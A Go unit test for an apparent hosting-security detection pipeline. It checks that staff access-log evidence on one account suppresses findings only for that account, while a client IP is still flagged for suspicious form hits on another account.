// Staff evidence on one account removes only that account's mail; the
// client is still judged on the rest, like any other client.
func TestPath6_AccessLogStaffLeavesOtherAccounts(t *testing.T) {
	p, findings := path6Pipeline(t, "a", "b")
	writeDomlog(t, "usera", "site-a.example-ssl_log", domlogLine(path6IP, "GET", "/wp-admin/post.php?post=7&action=edit", 200))
	feedVictims(t, p, "a", path6Ajax, path6IP, 0, 3, path6T0)
	feedVictims(t, p, "b", path6Form, path6IP, 3, 4, path6T0)
	requireNoPath6(t, *findings)
	feedVictims(t, p, "b", path6Form, path6IP, 7, 1, path6T0)
	clients, scripts := path6Of(*findings, path6Check), path6Of(*findings, path6Script)
	if len(clients) != 1 || clients[0].CPUser != "userb" || strings.Contains(clients[0].Details, "site-a.example") {
		t.Fatalf("client findings = %+v, want one on userb only", clients)
	}
	if len(scripts) != 1 || scripts[0].ScriptKey != "site-b.example:"+path6Form {
		t.Fatalf("script findings = %+v, want site-b's form only", scripts)
	}
}
